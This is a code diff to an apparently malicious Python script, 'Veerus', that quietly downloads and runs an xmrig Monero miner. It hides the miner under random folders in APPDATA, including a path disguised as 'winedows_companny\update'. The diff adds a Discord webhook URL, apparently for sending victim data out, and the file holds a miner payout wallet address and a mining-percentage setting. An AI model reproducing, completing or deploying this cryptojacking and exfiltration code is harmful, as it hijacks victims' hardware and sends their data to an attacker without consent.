@@ -58,7 +58,7 @@ USER_NAME = getpass.getuser()
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-chiffre = "webhook667"
+chiffre = "https://discord.com/api/webhooks/1010955669232427092/_-jN4hftRmAZuNv0I71Y87muhXfMDcG08LBKIwfcCWnm_9IKnrCgpJ7pk1Z8Dgf_ajnZ"
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only RandomX, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
 
@@ -69,7 +69,7 @@ PROCESS_PATHS = [
 	os.getenv('APPDATA') + "\\"+ str(uuid.uuid4()), 
 	os.getenv('LOCALAPPDATA') + "\\"+ str(uuid.uuid4()),
 ]
-PROCESS_NUM = processnumbers
+PROCESS_NUM = 2
 
 MINE = True #Mine crypto? True/False
 MINING_PERCENT = "30"
@@ -77,7 +77,7 @@ CUDA = False
 
 
 computer = wmi.WMI()
-MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/Services32.exe?raw=true"
+MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrig.exe?raw=true"
 GPUMODEL = computer.Win32_VideoController()[0]
 
 
@@ -660,7 +660,7 @@ if yes == "yes":
 				os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")
 				if CUDA == True:
 					XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\xmrig-nvidia-2.14.5\\xmrig-nvidia.exe"
-					r = requests.get("https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrigcuda.zip?raw=true")
+					r = requests.get("https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrig.exe?raw=true")
 
 					with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\curlcuda.zip", 'wb+') as f:
 						f.write(r.content)
